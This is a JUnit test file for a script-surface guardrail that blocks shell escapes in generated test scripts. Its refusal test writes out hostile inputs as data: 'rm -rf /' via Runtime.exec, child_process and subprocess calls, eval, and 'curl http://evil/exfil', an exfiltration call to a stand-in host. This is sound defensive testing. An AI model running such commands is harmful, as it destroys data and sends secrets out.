package com.aiqaos.execution.component;

import static org.assertj.core.api.Assertions.assertThat;

import com.aiqaos.core.guardrail.GuardrailContext;
import org.junit.jupiter.api.Test;

/** Unit tests for the SEC-3 execution script-surface guard. */
class ScriptSurfaceGuardrailTest {

    private final ScriptSurfaceGuardrail guard = new ScriptSurfaceGuardrail();

    private boolean allowed(String script) {
        return guard.check(script, GuardrailContext.output("execution")).isAllowed();
    }

    @Test
    void refusesProcessAndShellEscape() {
        assertThat(allowed("const cp = require('child_process'); cp.execSync('id');")).isFalse();
        assertThat(allowed("Runtime.getRuntime().exec(\"rm -rf /\");")).isFalse();
        assertThat(allowed("import subprocess; subprocess.run(['ls'])")).isFalse();
        assertThat(allowed("await fetch('http://x'); eval('danger()')")).isFalse();
        assertThat(allowed("curl http://evil/exfil")).isFalse();
    }

    @Test
    void allowsLegitimateTestScripts() {
        // Playwright / regex usage must pass — evaluate() must not match the eval( pattern.
        assertThat(allowed("await page.evaluate(() => document.title); const m = /ab/.exec('ab');")).isTrue();
        assertThat(allowed("await page.goto('https://example.com'); await expect(page).toHaveTitle(/Home/);")).isTrue();
        assertThat(allowed("")).isTrue();
        assertThat(allowed(null)).isTrue();
    }
}
